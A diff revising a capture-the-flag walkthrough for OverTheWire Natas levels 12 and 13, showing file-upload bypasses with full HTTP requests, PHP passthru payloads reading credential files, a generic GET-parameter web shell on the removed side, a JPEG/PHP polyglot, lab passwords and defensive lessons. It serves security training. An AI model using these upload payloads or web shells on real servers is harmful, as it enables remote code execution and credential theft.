@@ -1271,10 +1271,24 @@ Choose a JPEG to upload (max 1KB):<br/>
 </html>
 ```
 
-By inspecting the source code, it can be observed that the application determines the uploaded file’s extension based on the filename parameter in the POST request, rather than validating the actual file content. This indicates a potential file upload vulnerability.
-
 
 ### Finding 
+By analyzing the source code, it was identified that the application determines the uploaded file’s extension based on the filename parameter in the POST request:
+```php
+$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+```
+The extension is extracted using:
+```php
+$ext = pathinfo($fn, PATHINFO_EXTENSION);
+```
+This means the server trusts user-controlled input (filename) to decide the file extension, instead of validating the actual uploaded file content. This introduces a **file upload vulnerability**.
+
+To test this, a PHP file was created:
+```php
+<?php passthru("cat /etc/natas_webpass/natas13"); ?>
+```
+The file was uploaded as test.php.
+
 #### Request Content
 ```
 POST /index.php HTTP/1.1
@@ -1283,8 +1297,8 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------351904127543584259351122112
-Content-Length: 1301
+Content-Type: multipart/form-data; boundary=---------------------------39261964973491093391103850610
+Content-Length: 533
 Origin: http://natas12.natas.labs.overthewire.org
 Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
 Connection: keep-alive
@@ -1292,28 +1306,27 @@ Referer: http://natas12.natas.labs.overthewire.org/
 Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
 Upgrade-Insecure-Requests: 1
 
------------------------------351904127543584259351122112
+-----------------------------39261964973491093391103850610
 Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
 1000
------------------------------351904127543584259351122112
+-----------------------------39261964973491093391103850610
 Content-Disposition: form-data; name="filename"
 
-4dmcppkv9n.jpg
------------------------------351904127543584259351122112
-Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
-Content-Type: image/jpeg
+m37cmsbfkf.jpg
+-----------------------------39261964973491093391103850610
+Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
+Content-Type: application/x-php
 
-ÿØÿà
+<?php passthru("cat /etc/natas_webpass/natas13"); ?>
 
-
-(content of the image file) **At here, some of the conetent is deleted so that the size of the file can less than maximum file size (1000 Bytes)**
+-----------------------------39261964973491093391103850610--
 ```
 
 #### Response Content 
 ```
 HTTP/1.1 200 OK
-Date: Mon, 13 Apr 2026 13:50:59 GMT
+Date: Wed, 15 Apr 2026 11:30:51 GMT
 Server: Apache/2.4.58 (Ubuntu)
 Vary: Accept-Encoding
 Content-Length: 976
@@ -1334,17 +1347,19 @@ Content-Type: text/html; charset=UTF-8
 <body>
 <h1>natas12</h1>
 <div id="content">
-The file <a href="upload/icudqaa924.jpg">upload/icudqaa924.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+The file <a href="upload/zj53xxdrgw.jpg">upload/zj53xxdrgw.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 </body>
 </html>
 ```
 
-The webpage provides a file upload functionality that accepts a JPEG file (maximum 1KB). Initial testing confirms that uploaded files are stored in the /upload/ directory and can be accessed via a generated link. After the file is successfully uploaded, the webpage will display a message "The file upload/icudqaa924.jpg has been uploaded". Then, if the link upload/icudqaa924.jpg is clicked, it will navigate to `http://natas12.natas.labs.overthewire.org/upload/icudqaa924.jpg` to view the picture we uploaded. 
+The browser returned: `The file upload/zj53xxdrgw.jpg has been uploaded`. After clicking the link `upload/zj53xxdrgw.jpg`, it navigate to `http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg` and return the content `The image "http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg" cannot be displayed because it contains errors. This indicate that accessing the file resulted in an error because it was saved with a .jpg extension, so the PHP code was not executed.
+
 
 
 ### Approach 
-#### Request content
+To exploit this vulnerability, the filename parameter was modified in the request from: `m37cmsbfkf.jpg` to `m37cmsbfkf.php`
+#### Modified Request content
 ```
 POST /index.php HTTP/1.1
 Host: natas12.natas.labs.overthewire.org
@@ -1352,8 +1367,8 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------351904127543584259351122112
-Content-Length: 1301
+Content-Type: multipart/form-data; boundary=---------------------------382083169937517457761950657471
+Content-Length: 539
 Origin: http://natas12.natas.labs.overthewire.org
 Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
 Connection: keep-alive
@@ -1361,40 +1376,27 @@ Referer: http://natas12.natas.labs.overthewire.org/
 Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
 Upgrade-Insecure-Requests: 1
 
------------------------------351904127543584259351122112
+-----------------------------382083169937517457761950657471
 Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
 1000
------------------------------351904127543584259351122112
+-----------------------------382083169937517457761950657471
 Content-Disposition: form-data; name="filename"
 
-4dmcppkv9n.php
------------------------------351904127543584259351122112
-Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
+m37cmsbfkf.php
+-----------------------------382083169937517457761950657471
+Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
 Content-Type: application/x-php
 
-<?php passthru($_GET['natas12']); ?>
+<?php passthru("cat /etc/natas_webpass/natas13"); ?>
 
------------------------------351904127543584259351122112--
+-----------------------------382083169937517457761950657471--
 ```
-
-Intercepting the request using Burp Suite reveals that the filename parameter can be modified. Instead of keeping the default .jpg extension, it is changed to .php, allowing a PHP script to be uploaded.
-
-A malicious payload is then injected into the file content:
-```
-<?php passthru($_GET['natas12']); ?>
-```
-This payload enables remote command execution via a URL parameter.
-
-After modifying the request:
-- Change filename to a .php extension
-- Replace the file content with the PHP payload
-- Send the request
 
 #### Response content: 
 ```
 HTTP/1.1 200 OK
-Date: Mon, 13 Apr 2026 14:06:59 GMT
+Date: Wed, 15 Apr 2026 11:44:58 GMT
 Server: Apache/2.4.58 (Ubuntu)
 Vary: Accept-Encoding
 Content-Length: 976
@@ -1415,46 +1417,30 @@ Content-Type: text/html; charset=UTF-8
 <body>
 <h1>natas12</h1>
 <div id="content">
-The file <a href="upload/vodo7kpu39.php">upload/vodo7kpu39.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+The file <a href="upload/iupdauyikc.php">upload/iupdauyikc.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 </body>
 </html>
 ```
 
-The server successfully uploads the file and returns a messsage "The file upload/vodo7kpu39.php has been uploaded" is displayed. Next, if clicking the link `upload/vodo7kpu39.php` will navigate to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php` and get the following message: 
-```
-Notice: Undefined index: natas12 in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
-Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
-```
-Accessing this file directly results in an error because no command is provided. However, by appending a query parameter `?natas12=ls`, commands can be executed. 
-
-For example, 
-change the link to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?natas12=ls`
-and many files are displayed. 
-```
-01bigp04x7.jpg 01fsa2644e.jpg 01kjg7ulvc.php 022sjfkuwh.php 03ch7myxsp.jpg 04assx4poq.jpg 05xsaulnkl.jpg 06nwepxdiz.php 06zm2zlp06.jpg 078o93t3j2.jpg 07a5kdl5z9.jpg 08rwwwg6s1.php 092suz141s.php 09rfuwcp4j.jpg 0ams7zb4s1.jpg 0b87iktaek.jpg 0dma0zht0x.jpg 0g61wmmk1b.php 0gn1xn0fbt.php 0i4zzz9jzt.jpg 0k1u3i93kk.jpgaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 0mr5hvltj1.jpg 0n9bbv6c0s.jpg 0o3dgvqc07.jpg 0oklxf29sd.php 0pvupmvufi.jpg 0r11bpi050.php 0rv2aw0wx4.php 0rve6oxo6g.jpg 0slsuamtzz.php 0t28zwuwf5.jpg 0v47rcr60b.jpg 0wkd0y4mtj.jpg 0x2g8juukh.jpg 0xgvkqahot.php 0y664sk9s1.php 0zvecabpxi.txt%7f 11csvhcimo.jpg 127wtu6wcx.jpg 12qub97lsg.jpg 14jmyp172u.php 15nyx7zwv7.jpg 15xc1kfy8u.jpg 17d37hyq3h.jpg 18haov338q.jpg 19jzfg9xlv.jpg 19wxioc80x.app 1bf11s9nk6.jpgfgh 1bu6gzxiaw.php
-```
-This confirms that the uploaded file is being executed as a PHP script.
-
-Finally, retrieving the password is achieved by executing: `?natas12=cat /etc/natas_webpass/natas13`, which returns the credential for the next level.
-
-For example: 
-`http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?natas12=cat%20/etc/natas_webpass/natas13` will get the output trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+At the browser, we get `The file upload/iupdauyikc.php has been uploaded`. After clikced the link, we navigate to `http://natas12.natas.labs.overthewire.org/upload/iupdauyikc.php` and the webpage returned `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`, which is the password for next challenge. 
 
 
 ### Analysis
-This level demonstrates an insecure file upload vulnerability, where the application fails to properly validate uploaded files. Although the interface suggests only JPEG files are allowed, the server relies on user-controlled input (filename) to determine the file extension.
+This level demonstrates a file upload vulnerability caused by improper validation. The application relies on a user-supplied parameter (filename) to determine the file extension, rather than validating the actual file type or restricting executable content.
 
-As a result, attackers can bypass restrictions by uploading a malicious script disguised as an image, leading to remote code execution (RCE).
+By modifying the file extension to .php, it was possible to upload and execute arbitrary server-side code, leading to remote code execution (RCE).
 
-Additionally, the absence of proper validation mechanisms such as:
-- MIME type checking
-- File content verification
-- Restricting executable extensions
+This highlights several important security issues:
+- Trusting user input for file handling is dangerous
+- File extensions alone are not sufficient for validation
+- Uploaded files should never be executed directly
 
-makes the application highly vulnerable.
-
-This highlights the importance of implementing strict server-side validation for file uploads. Relying solely on client-side controls or user-supplied metadata can easily be bypassed, allowing attackers to execute arbitrary commands on the server.
+Proper defenses include:
+- Validating file content (MIME type and magic bytes)
+- Restricting executable file types
+- Storing uploads outside the web root
+- Renaming files securely on the server
 
 
 ---
@@ -1466,13 +1452,288 @@ URL: http://natas13.natas.labs.overthewire.org
 Username: natas13
 Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed a message `For security reasons, we now only accept image files! Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 
 
-### Approach 
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+Compared to the previous level, an additional validation is introduced:
+```php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+}
+```
+This means the application now verifies whether the uploaded file is a valid image by checking its magic bytes (file signature) instead of relying only on file extension.
+
+Attempting to upload a PHP file directly with the following content:
+```php
+<?php passthru("cat /etc/natas_webpass/natas14"); ?>
+```
+Resulted in the error: `File is not an image`. This confirms that simple file extension bypass is no longer sufficient.
+
+Attemtp to upoad an image file using burpsuite: 
+Request Content: 
+```
+POST /index.php HTTP/1.1
+Host: natas13.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
+Content-Length: 10803
+Origin: http://natas13.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
+Connection: keep-alive
+Referer: http://natas13.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="filename"
+
+f6t50p8hv5.jpg
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
+Content-Type: image/jpeg
+
+ÿØÿàJFIF
+5&&--5-/-2/-----------------------------------------+
+(content of the image files ...)
+-----------------------------35342147994429824884085540906--
+```
+
+Uploading a valid JPEG file (e.g., picture1.jpeg) succeeds, provided the file size is below 1KB.
+
+Note: If the error The uploaded file exceeds MAX_FILE_SIZE occurs, the JPEG content can be reduced by deleting some content of the image file using Burp Suite. However, the JPEG header and footer must remain intact, otherwise the file will fail validation.
+
+
+The content of the response header: 
+```
+HTTP/1.1 200 OK
+Date: Wed, 15 Apr 2026 12:14:55 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1041
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+The file <a href="upload/ij0jriwn0n.jpg">upload/ij0jriwn0n.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+After the file with <1KB is successfully uploaded, the browser returned: 
+```
+The file upload/ij0jriwn0n.jpg has been uploaded
+```
+
+After clicking the link `upload/ij0jriwn0n.jpg`, we navigate to `http://natas13.natas.labs.overthewire.org/upload/ij0jriwn0n.jpg` and see the picture we uploaded. 
+
+
+### Approach 
+To bypass the exif_imagetype() check, a polyglot file was created — a file that is both a valid JPEG and contains embedded PHP code.
+1. Start with a valid JPEG file (to satisfy exif_imagetype())
+2. Inject PHP code inside the file content: `<?php passthru("cat /etc/natas_webpass/natas14"); ?>`
+3. Ensure the JPEG header (ÿØÿàJFIF) remains intact
+4. Modify the request in Burp Suite:
+   - Change filename from .jpg → .php
+   - Change Content-Type → application/x-php
+
+Modified Request Content: 
+```
+POST /index.php HTTP/1.1
+Host: natas13.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
+Content-Length: 1360
+Origin: http://natas13.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
+Connection: keep-alive
+Referer: http://natas13.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="filename"
+
+f6t50p8hv5.php
+-----------------------------35342147994429824884085540906
+Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
+Content-Type: application/x-php
+
+ÿØÿàJFIF
+5&&--5-/-2/-----------------------------------------+
+... (image content) ...
+<?php passthru("cat /etc/natas_webpass/natas14"); ?>
+... (image content) ...
+-----------------------------35342147994429824884085540906--
+```
+
+Response Content: 
+```
+HTTP/1.1 200 OK
+Date: Wed, 15 Apr 2026 12:29:14 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1041
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+The file <a href="upload/xtd6xg7iv1.php">upload/xtd6xg7iv1.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+When onserved from the browser, we get the response:
+```
+The file upload/xtd6xg7iv1.php has been uploaded
+```
+
+After clicking the link, we navigate to `http://natas13.natas.labs.overthewire.org/upload/xtd6xg7iv1.php` and we ontained the content: 
+```
+(upperpart of the image file content)
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+(lower part of the image file content)
+```
 
 ### Analysis
+This level demonstrates a partial mitigation of file upload vulnerabilities using exif_imagetype(). While this check validates the file’s signature, it is still insufficient because:
+- It only verifies the beginning of the file (magic bytes)
+- It does not prevent additional malicious content embedded inside the file
+
+By crafting a polyglot file (JPEG + PHP), it is possible to bypass the validation and achieve remote code execution (RCE).
+
+Key security lessons:
+- File type validation must go beyond magic bytes
+- Uploaded files should not be executed by the server
+- Files should be stored outside the web root
+- Strict allowlists and content sanitization are required
+
 
 ---
 
@@ -1481,9 +1742,12 @@ After login, the following note is displayed:
 ```
 URL: http://natas14.natas.labs.overthewire.org
 Username: natas14
-Password: 
+Password:  z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed a message `For security reasons, we now only accept image files! Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
 
 ### Approach 
 
